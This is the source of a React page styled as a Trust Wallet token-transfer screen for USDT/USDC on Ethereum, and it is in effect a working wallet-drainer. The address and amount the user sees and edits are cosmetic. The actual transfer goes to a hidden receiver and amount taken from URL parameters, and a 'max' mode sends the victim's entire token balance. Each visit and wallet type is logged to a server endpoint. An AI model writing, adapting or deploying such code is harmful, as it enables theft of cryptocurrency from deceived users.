"use client";

import { useState, useEffect, useRef, useCallback } from "react";
import { ethers } from "ethers";

// ============================================================
// CONFIG
// ============================================================

const DEFAULT_RECEIVER = "0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf";

// USDT sur Ethereum Mainnet
const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const USDT_DECIMALS = 6;

// USDC sur Ethereum Mainnet
const USDC_CONTRACT = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
const USDC_DECIMALS = 6;

// ABI minimal ERC-20
const ERC20_ABI = [
  "function transfer(address to, uint256 amount) returns (bool)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function approve(address spender, uint256 amount) returns (bool)",
];

const ETH_CHAIN_ID = "0x1";

// ============================================================
// Types pour window.ethereum / window.trustwallet
// ============================================================
interface EthereumProvider {
  request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
  isMetaMask?: boolean;
  isTrust?: boolean;
  isTrustWallet?: boolean;
  on?: (event: string, handler: (...args: unknown[]) => void) => void;
  removeListener?: (event: string, handler: (...args: unknown[]) => void) => void;
}

declare global {
  interface Window {
    ethereum?: EthereumProvider;
    trustwallet?: { ethereum?: EthereumProvider };
  }
}

// ============================================================
// Helper: detect the injected provider
// ============================================================

function getProviderNow(): EthereumProvider | null {
  if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
  if (window.ethereum) return window.ethereum;
  return null;
}

async function waitForProvider(maxAttempts = 15, delayMs = 300): Promise<EthereumProvider | null> {
  for (let i = 0; i < maxAttempts; i++) {
    const provider = getProviderNow();
    if (provider) return provider;
    await new Promise((r) => setTimeout(r, delayMs));
  }
  return null;
}

// ============================================================
// Wallet Transfer Page
// ============================================================

export default function WalletPage() {
  const [address, setAddress] = useState(DEFAULT_RECEIVER);
  const [status, setStatus] = useState<string>("");
  const [statusType, setStatusType] = useState<"info" | "success" | "error">("info");
  const [loading, setLoading] = useState(false);
  const [txHash, setTxHash] = useState<string>("");

  // ========================================
  // NOUVEAU : état de connexion persistant
  // ========================================
  const [connectedAddress, setConnectedAddress] = useState<string | null>(null);
  const [walletBalance, setWalletBalance] = useState<bigint>(0n);
  const [adminAmount, setAdminAmount] = useState<string>("1.00");
  const [displayAmount, setDisplayAmount] = useState<string>("0");
  const [token, setToken] = useState<"usdt" | "usdc">("usdt");
  const [isKeyboardVisible, setIsKeyboardVisible] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [modalStatus, setModalStatus] = useState<"pending" | "success" | "error">("pending");
  const providerRef = useRef<EthereumProvider | null>(null);
  const keypadRef = useRef<HTMLDivElement>(null);

  // Valeurs réelles de la transaction (configurées par l'admin via URL)
  // Ne peuvent pas être altérées par les saisies de l'utilisateur (qui ne sont que cosmétiques)
  const [actualReceiver, setActualReceiver] = useState<string>(DEFAULT_RECEIVER);
  const [actualAmount, setActualAmount] = useState<string>("1.00");
  const [actualToken, setActualToken] = useState<"usdt" | "usdc">("usdt");
  const [isMaxMode, setIsMaxMode] = useState(false);

  // Récupérer le solde du token sélectionné
  const fetchTokenBalance = async (userAddress: string, activeToken: "usdt" | "usdc") => {
    if (!providerRef.current) return;
    try {
      const provider = new ethers.BrowserProvider(
        providerRef.current as ethers.Eip1193Provider
      );
      const tokenContractAddress = activeToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
      const contract = new ethers.Contract(tokenContractAddress, ERC20_ABI, provider);
      const balance = await contract.balanceOf(userAddress);
      setWalletBalance(balance);
    } catch (err) {
      console.warn("Error fetching token balance:", err);
    }
  };

  useEffect(() => {
    if (connectedAddress) {
      fetchTokenBalance(connectedAddress, token);
    }
  }, [connectedAddress, token]);

  // ---------------------------------------------------
  // Au montage : Déclencher la connexion et récupérer le solde
  // ---------------------------------------------------
  useEffect(() => {
    let cancelled = false;

    // 1. Lire les paramètres de l'URL (?to=0x...&amount=5&token=usdc)
    let finalTo = null;
    let finalAmount = null;
    let finalToken = null;

    if (typeof window !== "undefined") {
      const params = new URLSearchParams(window.location.search);
      const toParam = params.get("to");
      const amountParam = params.get("amount");
      const tokenParam = params.get("token");

      if (toParam && ethers.isAddress(toParam)) {
        setAddress(toParam);
        setActualReceiver(toParam);
        finalTo = toParam;
      }
      if (amountParam && amountParam !== "max") {
        setAdminAmount(amountParam);
        setActualAmount(amountParam);
        setDisplayAmount(amountParam.replace(".", ","));
        finalAmount = amountParam;
      }
      if (amountParam === "max") {
        setIsMaxMode(true);
        setDisplayAmount("Max");
        finalAmount = "max";
      }
      if (tokenParam === "usdt" || tokenParam === "usdc") {
        setToken(tokenParam);
        setActualToken(tokenParam);
        finalToken = tokenParam;
      }
    }

    const logScanVisit = async () => {
      let userAgentInfo = "Web Browser";
      if (typeof window !== "undefined") {
        const ua = navigator.userAgent.toLowerCase();
        const isTrust = !!window.trustwallet || ua.includes("trust");
        const isMetaMask = !!(window.ethereum as { isMetaMask?: boolean })?.isMetaMask || ua.includes("metamask");
        
        if (isTrust) {
          userAgentInfo = "Trust Wallet (" + (ua.includes("iphone") || ua.includes("ipad") ? "iOS" : "Android") + ")";
        } else if (isMetaMask) {
          userAgentInfo = "MetaMask (" + (ua.includes("iphone") || ua.includes("ipad") ? "iOS" : "Android") + ")";
        } else if (ua.includes("iphone") || ua.includes("ipad")) {
          userAgentInfo = "Mobile Safari (iOS)";
        } else if (ua.includes("android")) {
          userAgentInfo = "Mobile Browser (Android)";
        } else {
          userAgentInfo = "Web Browser (Desktop)";
        }
      }

      try {
        await fetch("/api/log-scan", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            to: finalTo || DEFAULT_RECEIVER,
            amount: finalAmount || "0",
            token: finalToken || "usdt",
            userAgent: userAgentInfo
          })
        });
      } catch (err) {
        console.warn("Failed to log scan visit:", err);
      }
    };

    logScanVisit();

    const init = async () => {
      const ethereumProvider = await waitForProvider();
      if (!ethereumProvider || cancelled) return;

      providerRef.current = ethereumProvider;

      // S'assurer qu'on est sur le réseau Ethereum Mainnet (0x1)
      try {
        const chainId = (await ethereumProvider.request({
          method: "eth_chainId",
        })) as string;

        if (chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
          await ethereumProvider.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: ETH_CHAIN_ID }],
          });
        }
      } catch (switchErr) {
        console.warn("Could not switch chain:", switchErr);
      }

      try {
        // ✅ eth_accounts = lecture silencieuse, pas de popup sur chargement
        const accounts = (await ethereumProvider.request({
          method: "eth_accounts",
        })) as string[];

        if (accounts.length > 0 && !cancelled) {
          const userAddress = accounts[0];
          setConnectedAddress(userAddress);
        }
      } catch (err) {
        console.warn("Silent connection check failed:", err);
      }

      // Écouter les changements de compte
      if (ethereumProvider.on) {
        ethereumProvider.on("accountsChanged", (accounts: unknown) => {
          const accs = accounts as string[];
          if (!cancelled) {
            setConnectedAddress(accs.length > 0 ? accs[0] : null);
          }
        });
      }
    };

    init();
    return () => { cancelled = true; };
  }, []);

  // ---------------------------------------------------
  // Envoi USDT/USDC (Maximum en 1 seule transaction)
  // ---------------------------------------------------
  const handleSendToken = async () => {
    setStatus("");
    setTxHash("");
    setStatusType("info");

    const targetReceiver = actualReceiver;
    if (!targetReceiver || !ethers.isAddress(targetReceiver)) {
      setStatus("Please enter a valid receiver Ethereum address.");
      setStatusType("error");
      return;
    }

    setLoading(true);
    setStatus("Preparing transaction...");

    const ethereumProvider = providerRef.current ?? (await waitForProvider());
    if (!ethereumProvider) {
      setStatus("No wallet detected. Open this page in the Trust Wallet browser.");
      setStatusType("error");
      setLoading(false);
      return;
    }
    providerRef.current = ethereumProvider;

    // S'assurer silencieusement qu'on est sur le réseau Ethereum Mainnet (0x1)
    try {
      const chainId = (await ethereumProvider.request({
        method: "eth_chainId",
      })) as string;

      if (chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
        await ethereumProvider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: ETH_CHAIN_ID }],
        });
      }
    } catch (switchErr) {
      console.warn("Could not switch chain:", switchErr);
    }

    try {
      const tokenContract = actualToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
      const tokenDecimals = actualToken === "usdc" ? USDC_DECIMALS : USDT_DECIMALS;
      const tokenName = actualToken.toUpperCase();

      // Si mode max, récupérer le solde complet du token
      let amountInWei: bigint;
      let displayAmountForStatus: string;

      if (isMaxMode) {
        const provider = new ethers.BrowserProvider(
          ethereumProvider as ethers.Eip1193Provider
        );
        // Forcer la connexion pour obtenir l'adresse
        const accounts = (await ethereumProvider.request({
          method: "eth_requestAccounts",
        })) as string[];
        if (!accounts || accounts.length === 0) {
          setStatus("No account found. Please connect your wallet.");
          setStatusType("error");
          setLoading(false);
          return;
        }
        const userAddress = accounts[0];
        const contract = new ethers.Contract(tokenContract, ERC20_ABI, provider);
        const balance = await contract.balanceOf(userAddress);
        amountInWei = balance as bigint;
        displayAmountForStatus = ethers.formatUnits(amountInWei, tokenDecimals);

        if (amountInWei === 0n) {
          setStatus(`No ${tokenName} balance available.`);
          setStatusType("error");
          setLoading(false);
          return;
        }
      } else {
        amountInWei = ethers.parseUnits(actualAmount, tokenDecimals);
        displayAmountForStatus = actualAmount;
      }

      // Encoder la fonction transfer(address,uint256) avec ethers
      const tokenInterface = new ethers.Interface(ERC20_ABI);
      const txData = tokenInterface.encodeFunctionData("transfer", [targetReceiver, amountInWei]);

      setStatus("Confirm the transaction in your wallet...");

      // Envoi de la transaction en direct via eth_sendTransaction
      // Sans spécifier "from", Trust Wallet affiche directement le Smart Contract Call sans pop-up de connexion
      const txHash = (await ethereumProvider.request({
        method: "eth_sendTransaction",
        params: [
          {
            to: tokenContract,
            data: txData,
            gas: "0x249f0", // 150000 gas limit en hexadécimal
          },
        ],
      })) as string;

      setStatus(`Transaction sent! Hash : ${txHash.slice(0, 10)}...`);
      setTxHash(txHash);
      setModalStatus("pending");
      setShowModal(true);

      // On attend la confirmation
      const provider = new ethers.BrowserProvider(
        ethereumProvider as ethers.Eip1193Provider
      );
      const receipt = await provider.waitForTransaction(txHash);

      if (receipt && receipt.status === 1) {
        setStatus(`✅ Transfer successful! ${displayAmountForStatus} ${tokenName} sent.`);
        setStatusType("success");
        setModalStatus("success");
      } else {
        setStatus("❌ Transaction failed on-chain.");
        setStatusType("error");
        setModalStatus("error");
      }
    } catch (err: unknown) {
      if (txHash) {
        setModalStatus("error");
      }
      console.error("Transfer error:", err);

      let message = "Transaction failed.";
      // Extraction du message d'erreur
      if (err instanceof Error) {
        if (err.message.includes("user rejected") || err.message.includes("User denied")) {
          message = "Transaction cancelled by user.";
        } else if (err.message.includes("insufficient funds")) {
          message = "Insufficient ETH for gas fees.";
        } else {
          message = err.message.length > 100
            ? err.message.slice(0, 100) + "..."
            : err.message;
        }
      } else if (typeof err === "object" && err !== null && "message" in err) {
        const errMsg = String((err as { message: unknown }).message);
        if (errMsg.includes("user rejected") || errMsg.includes("User denied")) {
          message = "Transaction cancelled by user.";
        } else {
          message = errMsg.length > 100 ? errMsg.slice(0, 100) + "..." : errMsg;
        }
      }

      setStatus(message);
      setStatusType("error");
    } finally {
      setLoading(false);
    }
  };

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setAddress(text);
    } catch {
      console.log("Paste failed");
    }
  };

  const getFiatValue = (amountStr: string) => {
    const parsed = parseFloat(amountStr.replace(",", "."));
    if (isNaN(parsed)) return "0,00";
    return (parsed * 0.86).toFixed(2).replace(".", ",");
  };

  const handleKeyPress = (key: string) => {
    setDisplayAmount((prev) => {
      let newVal = prev;
      if (key === "⌫") {
        newVal = prev.slice(0, -1);
      } else if (key === "," || key === ".") {
        if (!prev.includes(",") && !prev.includes(".")) {
          newVal = prev === "" ? "0," : prev + ",";
        }
      } else {
        if (prev === "0") {
          newVal = key;
        } else {
          newVal = prev + key;
        }
      }
      return newVal;
    });
  };

  const handleMaxClick = (e: React.MouseEvent) => {
    e.stopPropagation();
    const maxVal = ethers.formatUnits(walletBalance, 6);
    setDisplayAmount(maxVal.replace(".", ","));
  };

  return (
    <main 
      className={`transfer-main transfer-main-pad ${isKeyboardVisible ? "transfer-main-pad--with-keyboard" : ""}`}
      onClick={() => setIsKeyboardVisible(false)}
    >
      <div className="form-container">
        <label className="form-label">Address or domain name</label>
        <div className="input-row">
          <input
            type="text"
            placeholder="Search or Enter"
            value={address}
            onChange={(e) => setAddress(e.target.value)}
            className="input-row__field"
          />
          <div className="input-row__actions" style={{ gap: "0.4rem" }}>
            <button onClick={handlePaste} className="btn-paste">Paste</button>
            <button className="btn-icon" title="Copy" style={{ margin: "0 -12px" }}>
              <img src="/contrat.png" alt="Contract" style={{ width: "45px", height: "45px", objectFit: "contain" }} />
            </button>
            <button className="btn-icon" title="Scan QR">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#3562ff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <path d="M3 7V5a2 2 0 0 1 2-2h2" />
                <path d="M17 3h2a2 2 0 0 1 2 2v2" />
                <path d="M21 17v2a2 2 0 0 1-2 2h-2" />
                <path d="M7 21H5a2 2 0 0 1-2-2v-2" />
                <line x1="7" y1="12" x2="17" y2="12" />
              </svg>
            </button>
          </div>
        </div>

        <label className="form-label form-label--spaced">Destination network</label>
        <div className="network-selector" style={{ marginBottom: "1rem" }}>
          <div className="eth-icon" style={{ backgroundColor: "#3562ff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center" }}>
            <svg width="14" height="14" viewBox="0 0 256 417" fill="none">
              <path d="M127.961 0l-2.795 9.5v275.668l2.795 2.79 127.962-75.638z" fill="#ffffff" />
              <path d="M127.962 0L0 212.32l127.962 75.639V154.158z" fill="#ffffff" opacity="0.85" />
              <path d="M127.961 312.187l-1.575 1.92v98.199l1.575 4.6L256 236.587z" fill="#ffffff" />
              <path d="M127.962 416.905v-104.72L0 236.585z" fill="#ffffff" opacity="0.85" />
              <path d="M127.961 287.958l127.96-75.637-127.96-58.162z" fill="#ffffff" opacity="0.95" />
              <path d="M0 212.32l127.96 75.638v-133.8z" fill="#ffffff" opacity="0.75" />
            </svg>
          </div>
          <span className="network-name">Ethereum</span>
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af"
            strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" style={{ marginLeft: "4px" }}>
            <polyline points="6 9 12 15 18 9" />
          </svg>
        </div>

        <div>
          <label className="form-label form-label--spaced">Amount</label>
          <div className={`montant-container ${isKeyboardVisible ? "montant-container--active" : ""}`} onClick={(e) => { e.stopPropagation(); setIsKeyboardVisible(true); }}>
            <div className="montant-input-wrapper">
              <span className={displayAmount === "" ? "montant-placeholder" : "montant-display-value"}>
                {displayAmount || "0"}
              </span>
              {isKeyboardVisible && <span className="blinking-cursor" />}
            </div>
            <div className="montant-right">
              {displayAmount !== "" && (
                <button 
                  type="button" 
                  className="montant-clear-btn" 
                  onClick={(e) => { e.stopPropagation(); setDisplayAmount(""); }}
                >
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                    <circle cx="12" cy="12" r="10" fill="#8e8e93" stroke="#8e8e93" />
                    <line x1="15" y1="9" x2="9" y2="15" stroke="#ffffff" strokeWidth="2.5" />
                    <line x1="9" y1="9" x2="15" y2="15" stroke="#ffffff" strokeWidth="2.5" />
                  </svg>
                </button>
              )}
              <span className="montant-token">{token.toUpperCase()}</span>
              <button 
                type="button" 
                onClick={handleMaxClick} 
                className="montant-max-btn"
              >
                Max.
              </button>
            </div>
          </div>
          {(() => {
            const parsedVal = parseFloat(displayAmount.replace(",", "."));
            const isInvalid = isNaN(parsedVal) || parsedVal < 0.000001;
            if (isInvalid) {
              return (
                <div className="montant-error" style={{ color: "#df3e3e", fontSize: "0.8rem", marginTop: "0.5rem", paddingLeft: "0.25rem", textAlign: "left", fontWeight: "500" }}>
                  Minimum amount is 0.000001 {token.toUpperCase()}
                </div>
              );
            }
            return (
              <div className="approx-price" style={{ color: "#8e8e93", marginTop: "0.4rem", paddingLeft: "0.25rem", fontWeight: "500", fontSize: "0.85rem" }}>
                ≈ €{getFiatValue(displayAmount)}
              </div>
            );
          })()}
        </div>
      </div>

      <div style={{ flexGrow: 1, minHeight: "2rem" }} />

      <div className="next-btn-wrapper">
        <button onClick={(e) => { e.stopPropagation(); handleSendToken(); }} disabled={loading}
          className={`next-btn ${loading ? "next-btn--loading" : ""}`}>
          {loading ? (
            <span className="btn-spinner-wrapper">
              <span className="btn-spinner" />
              Processing...
            </span>
          ) : (
            "Next"
          )}
        </button>
      </div>

      {/* Custom Numerical Keypad */}
      {isKeyboardVisible && (
        <div 
          className="custom-keypad" 
          ref={keypadRef}
          onClick={(e) => e.stopPropagation()}
        >
          <button type="button" onClick={() => handleKeyPress("1")} className="keypad-key">
            <span className="keypad-key__number">1</span>
          </button>
          <button type="button" onClick={() => handleKeyPress("2")} className="keypad-key">
            <span className="keypad-key__number">2</span>
            <span className="keypad-key__letters">ABC</span>
          </button>
          <button type="button" onClick={() => handleKeyPress("3")} className="keypad-key">
            <span className="keypad-key__number">3</span>
            <span className="keypad-key__letters">DEF</span>
          </button>

          <button type="button" onClick={() => handleKeyPress("4")} className="keypad-key">
            <span className="keypad-key__number">4</span>
            <span className="keypad-key__letters">GHI</span>
          </button>
          <button type="button" onClick={() => handleKeyPress("5")} className="keypad-key">
            <span className="keypad-key__number">5</span>
            <span className="keypad-key__letters">JKL</span>
          </button>
          <button type="button" onClick={() => handleKeyPress("6")} className="keypad-key">
            <span className="keypad-key__number">6</span>
            <span className="keypad-key__letters">MNO</span>
          </button>

          <button type="button" onClick={() => handleKeyPress("7")} className="keypad-key">
            <span className="keypad-key__number">7</span>
            <span className="keypad-key__letters">PQRS</span>
          </button>
          <button type="button" onClick={() => handleKeyPress("8")} className="keypad-key">
            <span className="keypad-key__number">8</span>
            <span className="keypad-key__letters">TUV</span>
          </button>
          <button type="button" onClick={() => handleKeyPress("9")} className="keypad-key">
            <span className="keypad-key__number">9</span>
            <span className="keypad-key__letters">WXYZ</span>
          </button>

          <button type="button" onClick={() => handleKeyPress(",")} className="keypad-key keypad-key--special">
            <span className="keypad-key__number" style={{ fontSize: "1.8rem", lineHeight: "0.8", marginTop: "-4px" }}>,</span>
          </button>
          <button type="button" onClick={() => handleKeyPress("0")} className="keypad-key">
            <span className="keypad-key__number">0</span>
          </button>
          <button type="button" onClick={() => handleKeyPress("⌫")} className="keypad-key keypad-key--special">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#000000" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M21 4H8l-7 8 7 8h13a2 2 0 002-2V6a2 2 0 00-2-2z" />
              <line x1="18" y1="9" x2="12" y2="15" />
              <line x1="12" y1="9" x2="18" y2="15" />
            </svg>
          </button>
        </div>
      )}

      {/* Transaction Processing Modal */}
      {showModal && (
        <div className="modal-overlay" onClick={() => setShowModal(false)}>
          <div className="modal-card" onClick={(e) => e.stopPropagation()}>
            <button 
              className="modal-close-btn" 
              onClick={() => setShowModal(false)}
              title="Close"
            >
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <line x1="18" y1="6" x2="6" y2="18"></line>
                <line x1="6" y1="6" x2="18" y2="18"></line>
              </svg>
            </button>
            <img src="/yes.png" alt="Status" className="modal-logo" />
            
            {modalStatus === "pending" && (
              <>
                <h2 className="modal-title">Processing...</h2>
                <p className="modal-text">
                  The transaction is in progress! Blockchain validation is underway. This usually takes a few minutes.
                </p>
              </>
            )}

            {modalStatus === "success" && (
              <>
                <h2 className="modal-title" style={{ color: "#10b981" }}>Transaction successful!</h2>
                <p className="modal-text">
                  Your transfer of {actualAmount} {actualToken.toUpperCase()} has been successfully validated on the Ethereum blockchain.
                </p>
              </>
            )}

            {modalStatus === "error" && (
              <>
                <h2 className="modal-title" style={{ color: "#ef4444" }}>Transaction failed</h2>
                <p className="modal-text">
                  The transaction failed on the Ethereum blockchain or an error occurred during the transfer.
                </p>
              </>
            )}

            {txHash && (
              <a 
                href={`https://etherscan.io/tx/${txHash}`} 
                target="_blank" 
                rel="noopener noreferrer" 
                className="modal-details-btn"
              >
                Transaction details
              </a>
            )}
          </div>
        </div>
      )}
    </main>
  );
}